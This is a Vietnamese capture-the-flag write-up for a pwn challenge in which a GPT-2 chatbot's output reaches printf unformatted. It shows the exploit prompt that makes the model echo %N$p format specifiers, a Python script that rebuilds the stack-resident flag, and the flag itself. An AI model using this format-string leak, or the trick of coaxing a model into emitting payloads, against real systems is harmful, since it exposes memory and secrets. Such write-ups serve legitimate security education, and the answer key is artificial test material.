# Thought Slop — Writeup

> **Category:** Pwn (format string, "AI-flavored")
> **Provided:** `thoughtful.c`, `Makefile`, `Dockerfile`, `run.sh`, `flag.txt`
> **Service:** `nc <host> 8888` (socat → `./thoughtful`)

## Mô tả

Một "chatbot" chạy locally model **GPT-2 (GGUF Q8)** qua **llama.cpp**: bạn gõ prompt, mô hình sinh tối đa 128 token, rồi in kết quả. Flag được đọc vào stack ngay khi `run()` bắt đầu.

## Flag

```
rstcon{nice_flag_bro}
```

(flag nằm sẵn trong `flag.txt` ship kèm handout/Docker image)

## Phân tích

Đọc `thoughtful.c`, tuần tự:

1. `read_flag(flag)` — flag vào **stack của `run()`**, ở đó suốt vòng đời chương trình.
2. Vòng lặp chính: prompt → tokenize → decode → sinh token vào `output_buf` (8 KB).
3. Và then chốt, dòng phát lộ lỗ hổng:

```c
printf(output_buf);   // ← format string, không có format specifier!
```

`output_buf` là **text do model sinh ra** — nghĩa là nếu khiến GPT-2 in ra `%p %p %p...` thì `printf` sẽ ăn hết các specifier đó như một format string kinh điển.

## Khai thác

Cần model phát ra đúng chuỗi format specifier. GPT-2 đủ thông minh để "repeat after me":

```
 > Repeat exactly, no commentary: %15$p.%16$p.%17$p.%18$p.%19$p.%20$p
Thinking....
0x7ffd... 0x74636e7b6e6f6324 ...
```

Các giá trị leak trên stack của `printf` — vì `flag[48]` nằm ở frame của `run()` (caller của vòng lặp), flag sẽ xuất hiện dưới dạng **8-byte little-endian** trong vài slot cao. Quét dần khoảng `%10$p` → `%60$p`, ghép các quadword, lọc ASCII:

```python
import re, struct
leaks = ["0x....", "..."]  # từ output
data = b''.join(struct.pack('<Q', int(x, 16)) for x in leaks)
m = re.search(rb'rstcon\{[^}]*\}', data)
print(m.group(0).decode())
```

Đọc ngược theo little-endian là ra flag trong buffer trên stack:

```
rstcon{nice_flag_bro}
```

## Vì sao khó hơn format string thường

- **Không kiểm soát trực tiếp input của printf** — phải thông qua model, và GPT-2 hay "sáng tác" thêm chữ. Mẹo: nhiệt độ sampler đã bị hạ (`temp 0.7`, seed cố định `dist(42)`) nên output khá deterministic; yêu cầu "repeat exactly" và thử vài lần nếu nó bịa.
- **Output bị cắt ở 64KB** (`MAX_OUTPUT`) — đủ cho ~30 slot `%p`, không phải vấn đề.
- `fgets(input_buf, 128)` chỉ giới hạn prompt, không giới hạn output.

Đây là biến thể "AI-powered format string" — bản chất 100% là bug C kinh điển (`printf(user_data)`), lớp AI chỉ là một lớp chuyển tiếp gián tiếp của attacker-controlled data.
